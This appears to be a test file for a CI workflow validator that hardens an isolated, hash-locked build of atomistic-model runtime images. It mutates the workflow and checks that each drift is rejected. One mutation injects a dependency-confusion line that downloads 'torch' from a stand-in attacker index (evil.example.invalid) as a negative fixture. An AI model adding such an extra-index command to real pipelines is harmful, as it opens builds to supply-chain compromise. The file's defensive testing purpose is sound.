    expect(upload.if).toBe("always() && steps.stage_outputs.outcome == 'success'");
  });

  it('keeps cold-install hook globs literal inside the nested single-quoted shell', () => {
    const workflow = parseYaml(atomisticBootstrapSource);
    const coldInstall = namedStep(workflow, 'Prove a cold, hash-locked install with no network').run;
    expect(coldInstall).toContain("sh -euc '");
    expect(coldInstall).toContain('-mindepth 1 -maxdepth 1');
    expect(coldInstall).toContain('-iname \\*.pth');
    expect(coldInstall).toContain('-iname sitecustomize.\\*');
    expect(coldInstall).toContain('unexpected_hooks="$(find');
    expect(coldInstall).not.toContain("-iname '*.pth'");
  });

  it('runs the independent inventory verifier without local or site import shadowing', () => {
    const workflow = parseYaml(atomisticBootstrapSource);
    for (const stepName of [
      'Freeze and verify the exact resolved wheel set',
      'Build the isolated runtime image with no build-step network',
    ]) {
      const run = namedStep(workflow, stepName).run;
      expect(run, stepName).toContain('python3 -I -S -B scripts/atomistic/verify_runtime_inventory.py');
      expect(run, stepName).not.toMatch(/python3\s+-B\s+scripts\/atomistic\/verify_runtime_inventory\.py/);
    }
  });

  it('rejects trigger, main guard, runtime, architecture and model-isolation drift', () => {
    const cases = [
      ['push trigger', (workflow) => { workflow.on = { push: null }; }],
      ['workflow input override', (workflow) => { workflow.on.workflow_dispatch = { inputs: { plan: { required: false } } }; }],
      ['non-main guard', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace('refs/heads/main', 'refs/heads/review');
      }],
      ['mutable Node runtime', (workflow) => {
        namedStep(workflow, 'Install the pinned JavaScript runtime').with['node-version'] = '24';
      }],
      ['shallow checkout hides the pinned R5 Git object', (workflow) => {
        namedStep(workflow, 'Check out the dispatched revision without credentials').with['fetch-depth'] = 1;
      }],
      ['base image drift', (workflow) => { workflow.env.BASE_IMAGE = `python:3.12.13@sha256:${'1'.repeat(64)}`; }],
      ['base platform digest drift', (workflow) => { workflow.env.BASE_IMAGE_AMD64_DIGEST = `sha256:${'2'.repeat(64)}`; }],
      ['frontend drift', (workflow) => { workflow.env.DOCKERFILE_FRONTEND = `docker/dockerfile:1.7@sha256:${'3'.repeat(64)}`; }],
      ['runner OS drift', (workflow) => { workflow.jobs.bootstrap['runs-on'] = 'macos-14'; }],
      ['joint model execution', (workflow) => { workflow.jobs.bootstrap.strategy.matrix.model = ['mattersim-and-mace']; }],
      ['publish root drift', (workflow) => {
        const step = namedStep(workflow, 'Create fresh, model-isolated working directories');
        step.run = step.run.replace(
          'publish_dir="$RUNNER_TEMP/tailing-atomistic-publish/$MODEL"',
          'publish_dir="/tmp/unreviewed"',
        );
      }],
      ['publish directory creation drift', (workflow) => {
        const step = namedStep(workflow, 'Create fresh, model-isolated working directories');
        step.run = step.run.replace(
          '"$output_dir" "$publish_dir"',
          '"$output_dir" "$PUBLISH_DIR"',
        );
      }],
      ['unreviewed job key', (workflow) => { workflow.jobs.bootstrap.container = ATOMISTIC_BOOTSTRAP_BASE_IMAGE; }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });

  it('rejects runtime-lock, runtime-input, reproducible-build, observation, and staged-evidence drift', () => {
    const cases = [
      ['runtime lock digest', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run = step.run.replace(ATOMISTIC_RUNTIME_DISCOVERY_LOCK_SHA256, '0'.repeat(64));
      }],
      ['P Git ancestry check', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run = step.run.replace("execFileSync('git', ['merge-base', '--is-ancestor'", "execFileSync('git', ['rev-parse'");
      }],
      ['historical runtime lock substituted for current lock', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run = step.run.replace(ATOMISTIC_RUNTIME_DISCOVERY_LOCK_SHA256, ATOMISTIC_HISTORICAL_RUNTIME_DISCOVERY_LOCK_SHA256);
      }],
      ['runtime-input creation', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace('scripts/atomistic/runtime-input-contract.mjs write-new', 'scripts/atomistic/runtime-input-contract.mjs verify-exact');
      }],
      ['runtime-input freeze verification', (workflow) => {
        const step = namedStep(workflow, 'Freeze and verify the exact resolved wheel set');
        step.run = step.run.replace('scripts/atomistic/runtime-input-contract.mjs verify-exact', 'true');
      }],
      ['source date epoch', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--build-arg "SOURCE_DATE_EPOCH=$SOURCE_DATE_EPOCH"', '--build-arg "SOURCE_DATE_EPOCH=0"');
      }],
      ['runtime source label', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('$RUNTIME_SOURCE_REVISION', '$GITHUB_SHA');
      }],
      ['workflow tag mislabeled as runtime source', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('image_tag="tailing-atomistic-$MODEL-bootstrap:$GITHUB_SHA"', 'image_tag="tailing-atomistic-$MODEL-bootstrap:$RUNTIME_SOURCE_REVISION"');
      }],
      ['observer workflow revision mislabeled as runtime source', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--workflow-revision "$GITHUB_SHA"', '--workflow-revision "$RUNTIME_SOURCE_REVISION"');
      }],
      ['Buildx metadata capture', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--metadata-file "$BUILD_CONTEXT/$MODEL.buildx-metadata.json"', '');
      }],
      ['container observation writer', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('scripts/atomistic/write-container-observation.mjs write-new', 'true');
      }],
      ['staged runtime-input identity', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace('copy_regular_if_present "$LOCK_DIR/$MODEL.runtime-inputs.json" "$PUBLISH_DIR/manifests/$MODEL.runtime-inputs.json"', 'true');
      }],
      ['staged container observation', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace('copy_regular_if_present "$BUILD_CONTEXT/$MODEL.container-observation.json" "$PUBLISH_DIR/manifests/$MODEL.container-observation.json"', 'true');
      }],
      ['staged raw Buildx diagnostics', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace('copy_regular_if_present "$BUILD_CONTEXT/$MODEL.buildx-metadata.json" "$PUBLISH_DIR/diagnostics/$MODEL.buildx-metadata.json"', 'true');
      }],
    ];
    for (const [label, mutate] of cases) expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
  });

  it('rejects drift in every selected P source path, blob OID, Git mode, size, or SHA-256', () => {
    for (const source of ATOMISTIC_SELECTED_SOURCE_FILES) {
      const mutations = [
        ['path', source.path, `${source.path}.unreviewed`],
        ['git blob OID', source.gitBlobOid, `${source.gitBlobOid.slice(0, -1)}${source.gitBlobOid.endsWith('0') ? '1' : '0'}`],
        ['size', `sizeBytes: ${source.sizeBytes}`, `sizeBytes: ${source.sizeBytes + 1}`],
        ['SHA-256', source.sha256, `sha256:${'f'.repeat(64)}`],
      ];
      for (const [field, before, after] of mutations) {
        expect(inspectMutatedBootstrap((workflow) => {
          const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
          step.run = step.run.replace(before, after);
        }), `${source.path} ${field}`).not.toEqual([]);
      }
      expect(inspectMutatedBootstrap((workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        const modePattern = new RegExp(`gitBlobOid: '${source.gitBlobOid}',(?:\\s|.)*?mode: '100644'`);
        step.run = step.run.replace(modePattern, (match) => match.replace("mode: '100644'", "mode: '100755'"));
      }), `${source.path} Git mode`).not.toEqual([]);
    }
    for (const [label, before, after] of [
      ['P revision', ATOMISTIC_RUNTIME_SOURCE_REVISION, '0'.repeat(40)],
      ['source manifest', ATOMISTIC_SOURCE_MANIFEST_DIGEST, `sha256:${'0'.repeat(64)}`],
      ['materialization digest', ATOMISTIC_MATERIALIZATION_DIGEST, `sha256:${'1'.repeat(64)}`],
    ]) {
      expect(inspectMutatedBootstrap((workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run = step.run.replace(before, after);
      }), label).not.toEqual([]);
    }
  });

  it('rejects drift in both source-to-build-to-container materializations', () => {
    for (const mapping of ATOMISTIC_RUNTIME_MATERIALIZATIONS) {
      for (const [field, before, after] of [
        ['name', `name: '${mapping.name}'`, `name: 'unreviewed-${mapping.name}'`],
        ['sourcePath', `sourcePath: '${mapping.sourcePath}'`, `sourcePath: '${mapping.sourcePath}.unreviewed'`],
        ['buildPath', `buildPath: '${mapping.buildPath}'`, `buildPath: '${mapping.buildPath}.unreviewed'`],
        ['standardContainerPath', `standardContainerPath: '${mapping.standardContainerPath}'`, `standardContainerPath: '${mapping.standardContainerPath}.unreviewed'`],
        ['sizeBytes', `sizeBytes: ${mapping.sizeBytes}`, `sizeBytes: ${mapping.sizeBytes + 1}`],
        ['sha256', mapping.sha256, `sha256:${'e'.repeat(64)}`],
      ]) {
        expect(inspectMutatedBootstrap((workflow) => {
          const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
          step.run = step.run.replace(before, after);
        }), `${mapping.name} ${field}`).not.toEqual([]);
      }
    }
  });

  it('rejects tracked-R5 access, mutable staging, and non-exact build contexts', () => {
    const cases = [
      ['runtime source root aliases build context', (workflow) => {
        const step = namedStep(workflow, 'Create fresh, model-isolated working directories');
        step.run = step.run.replace('runtime_source_root="$task_root/runtime-source"', 'runtime_source_root="$task_root/build-context"');
      }],
      ['tracked R5 runner read', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run += '\ncp "$GITHUB_WORKSPACE/scripts/atomistic/run_model.py" "$BUILD_CONTEXT/scripts/atomistic/run_model.py"\n';
      }],
      ['tracked R5 runner overwrite', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run += '\ncp "$RUNTIME_SOURCE_ROOT/scripts/atomistic/v2/run_model.py" "$GITHUB_WORKSPACE/scripts/atomistic/run_model.py"\n';
      }],
      ['staged files made writable', (workflow) => {
        const step = namedStep(workflow, 'Bind paths and runner constants from the frozen plan');
        step.run = step.run.replace('chmodSync(target, 0o444)', 'chmodSync(target, 0o644)');
      }],
      ['staged mode check weakened', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('test "$(stat -c \'%a\' "$materialized")" = 444', 'test "$(stat -c \'%a\' "$materialized")" = 644');
      }],
      ['other model Dockerfile admitted', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace(
          'actual_context_files="$(cd "$BUILD_CONTEXT" && find . -type f -print | LC_ALL=C sort)"',
          'actual_context_files="$expected_context_files"',
        );
      }],
      ['extra context file admitted', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace(
          'test "$actual_context_files" = "$expected_context_files"',
          'test -n "$actual_context_files"',
        );
      }],
      ['runner source root replaced by workspace', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--runner-source-root "$RUNTIME_SOURCE_ROOT"', '--runner-source-root "$GITHUB_WORKSPACE"');
      }],
      ['runner build root replaced by workspace', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--runner-build-root "$BUILD_CONTEXT"', '--runner-build-root "$GITHUB_WORKSPACE"');
      }],
    ];
    for (const [label, mutate] of cases) expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
  });

  it('rejects runtime-input/observer tool drift and inference provenance env drift', () => {
    const cases = [
      ['runtime-input tool digest', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace(ATOMISTIC_RUNTIME_INPUT_CONTRACT_SHA256, '0'.repeat(64));
      }],
      ['observer tool digest', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace(ATOMISTIC_CONTAINER_OBSERVATION_WRITER_SHA256, '0'.repeat(64));
      }],
      ['workflow revision env deleted', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--env "TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA"', '');
      }],
      ['runtime source revision env deleted', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--env "TAILING_ATOMISTIC_RUNTIME_SOURCE_REVISION=$RUNTIME_SOURCE_REVISION"', '');
      }],
      ['Docker local config image ID env deleted', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--env "TAILING_ATOMISTIC_DOCKER_LOCAL_CONFIG_IMAGE_ID=$DOCKER_LOCAL_CONFIG_IMAGE_ID"', '');
      }],
      ['workflow/runtime revisions swapped', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run
          .replace('TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA', 'TAILING_ATOMISTIC_WORKFLOW_REVISION=$RUNTIME_SOURCE_REVISION')
          .replace('TAILING_ATOMISTIC_RUNTIME_SOURCE_REVISION=$RUNTIME_SOURCE_REVISION', 'TAILING_ATOMISTIC_RUNTIME_SOURCE_REVISION=$GITHUB_SHA');
      }],
      ['legacy GITHUB_SHA env restored', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace(
          '--env "TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA"',
          '--env "TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA" \\\n            --env "GITHUB_SHA=$GITHUB_SHA"',
        );
      }],
      ['legacy container digest env restored', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace(
          '--env "TAILING_ATOMISTIC_DOCKER_LOCAL_CONFIG_IMAGE_ID=$DOCKER_LOCAL_CONFIG_IMAGE_ID"',
          '--env "TAILING_ATOMISTIC_DOCKER_LOCAL_CONFIG_IMAGE_ID=$DOCKER_LOCAL_CONFIG_IMAGE_ID" \\\n            --env "TAILING_ATOMISTIC_CONTAINER_DIGEST=$DOCKER_LOCAL_CONFIG_IMAGE_ID"',
        );
      }],
      ['unreviewed extra env', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace(
          '--env "TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA"',
          '--env "TAILING_ATOMISTIC_WORKFLOW_REVISION=$GITHUB_SHA" \\\n            --env "EXTRA=1"',
        );
      }],
    ];
    for (const [label, mutate] of cases) expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
  });

  it('rejects alternate package sources and any networked resolve, cold-install, build or checkpoint run', () => {
    const cases = [
      ['alternate PyTorch source', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX, 'https://pypi.example.invalid/simple');
      }],
      ['alternate remaining-dependency source', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(ATOMISTIC_BOOTSTRAP_PYPI_INDEX, 'https://mirror.example.invalid/simple');
      }],
      ['dependency-confusion extra index', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run += '\npython -m pip download --extra-index-url https://evil.example.invalid/simple torch\n';
      }],
      ['cached dependency downloads', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace('--no-cache-dir', '--cache-dir=/tmp/pip-cache');
      }],
      ['expanded dependency tmpfs', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace('size=1g,mode=1777', 'size=8g,mode=1777');
      }],
      ['python-hostlist sdist drift', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(PYTHON_HOSTLIST_SDIST_SHA256, 'f'.repeat(64));
      }],
      ['networked source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        const start = step.run.indexOf('for derived_output in');
        const suffix = step.run.slice(start).replace('--network=none', '--network=bridge');
        step.run = step.run.slice(0, start) + suffix;
      }],
      ['workspace mounted into source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(
          '--mount "type=bind,src=$SOURCE_BUILD_INPUTS,dst=/inputs,readonly"',
          '--mount "type=bind,src=$GITHUB_WORKSPACE,dst=/repo,readonly"',
        );
      }],
      ['host-UID-scoped nproc limit in source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(
          '--ulimit nofile=256:256',
          '--ulimit nofile=256:256 \\\n                --ulimit nproc=64:64',
        );
      }],
      ['equals-form host-UID-scoped nproc limit in source builder', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace(
          '--ulimit nofile=256:256',
          '--ulimit nofile=256:256 \\\n                --ulimit=nproc=64:64',
        );
      }],
      ['missing container-scoped source-builder PID limit', (workflow) => {
        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
        step.run = step.run.replace('--pids-limit=64', '--pids-limit=-1');
      }],
      ['derived provenance omitted from offline resolver', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace(
          'derived_arguments=(--derived-wheel-manifest /manifests/python-hostlist.derived-wheel.manifest.json)',
          'derived_arguments=()',
        );
      }],
      ['networked lock resolution', (workflow) => {
        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['networked cold install', (workflow) => {
        const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['host-UID-scoped nproc limit in cold install', (workflow) => {
        const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
        step.run = step.run.replace(
          '--ulimit nofile=1024:1024',
          '--ulimit nofile=1024:1024 \\\n            --ulimit nproc=256:256',
        );
      }],
      ['missing container-scoped cold-install PID limit', (workflow) => {
        const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
        step.run = step.run.replace('--pids-limit=256', '--pids-limit=-1');
      }],
      ['networked image build', (workflow) => {
        const step = namedStep(workflow, 'Build the isolated runtime image with no build-step network');
        step.run = step.run.replace('--network=none', '--network=default');
      }],
      ['networked checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--network=none', '--network=bridge');
      }],
      ['fixed-UID nproc limit in checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace(
          '--ulimit nofile=1024:1024',
          '--ulimit nofile=1024:1024 \\\n            --ulimit nproc=256:256',
        );
      }],
      ['missing container-scoped checkpoint PID limit', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--pids-limit=256', '--pids-limit=-1');
      }],
      ['non-amd64 checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--platform=linux/amd64', '--platform=linux/arm64');
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });

  it('diagnoses UID-scoped nproc and missing container PID boundaries semantically', () => {
    const nprocFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
      step.run = step.run.replace(
        '--ulimit nofile=256:256',
        '--ulimit nofile=256:256 \\\n                --ulimit=nproc=64:64',
      );
    }).join('\n');
    expect(nprocFailures).toMatch(/RLIMIT_NPROC/);

    const coldPidFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Prove a cold, hash-locked install with no network');
      step.run = step.run.replace('--pids-limit=256', '--pids-limit=-1');
    }).join('\n');
    expect(coldPidFailures).toMatch(/cold install must remain hash-locked/);

    const sourcePidFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
      step.run = step.run.replace('--pids-limit=64', '--pids-limit=-1');
    }).join('\n');
    expect(sourcePidFailures).toMatch(/source-only python-hostlist dependency/);

    const inferencePidFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
      step.run = step.run.replace('--pids-limit=256', '--pids-limit=-1');
    }).join('\n');
    expect(inferencePidFailures).toMatch(/checkpoint inference must remain/);
  });

  it('rejects computed or quote-concatenated ulimit values beyond the exact allowlist', () => {
    const computedFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
      step.run = `host_limit=nproc=64:64\n${step.run.replace(
        '--ulimit nofile=256:256',
        ['--ulimit nofile=256:256 \\', '                --ulimit "$host_limit"'].join('\n'),
      )}`;
    }).join('\n');
    expect(computedFailures).toMatch(/exact reviewed .* multiset/);

    const concatenatedFailures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
      step.run = step.run.replace(
        '--ulimit nofile=256:256',
        ['--ulimit nofile=256:256 \\', '                --ulimit npr"oc=64:64"'].join('\n'),
      );
    }).join('\n');
    expect(concatenatedFailures).toMatch(/exact reviewed .* multiset/);
  });

  it('rejects substitution with another allowlisted ulimit value', () => {
    const failures = inspectMutatedBootstrap((workflow) => {
      const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
      step.run = step.run.replace('--ulimit nofile=64:64', '--ulimit nofile=1024:1024');
    }).join('\n');
    expect(failures).toMatch(/exact reviewed .* multiset/);
  });

  it('rejects broader artifacts, full runs, metrics, receipts and attestations', () => {
    const cases = [
      ['promotional artifact name', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.name = 'tailing-atomistic-full-${{ github.sha }}';
      }],
      ['whole-workspace upload', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').with.path = '${{ github.workspace }}/';
      }],
      ['unguarded upload after failed staging', (workflow) => {
        namedStep(workflow, 'Upload the allowlisted bootstrap bundle').if = 'always()';
      }],
      ['full checkpoint run', (workflow) => {
        const step = namedStep(workflow, 'Run checkpoint deserialization and smoke predictions in the final sandbox');
        step.run = step.run.replace('--mode smoke', '--mode full');
      }],
      ['checkpoint publication', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run += '\ninstall -m 0444 "$CACHE_ROOT/$CHECKPOINT_CACHE_PATH" "$PUBLISH_DIR/checkpoint.model"\n';
      }],
      ['forged outcome stage', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.env.STAGE_INFERENCE = '${{ steps.build.outcome }}';
      }],
      ['forged intermediate outcome mapping', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace(
          '--stage "resolve=$STAGE_RESOLVE"',
          '--stage "resolve=$STAGE_FREEZE"',
        );
      }],
      ['outcome manifest omitted', (workflow) => {
        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
        step.run = step.run.replace('python -B scripts/atomistic/write_bootstrap_outcome.py', 'true');
      }],
      ['metrics side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Compute metrics', shell: 'bash', run: 'node compute-metrics.mjs' });
      }],
      ['receipt side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Create receipt', shell: 'bash', run: 'node create-receipt.mjs' });
      }],
      ['attestation side step', (workflow) => {
        workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Attest', uses: `actions/attest-build-provenance@${'a'.repeat(40)}` });
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }
  });
});
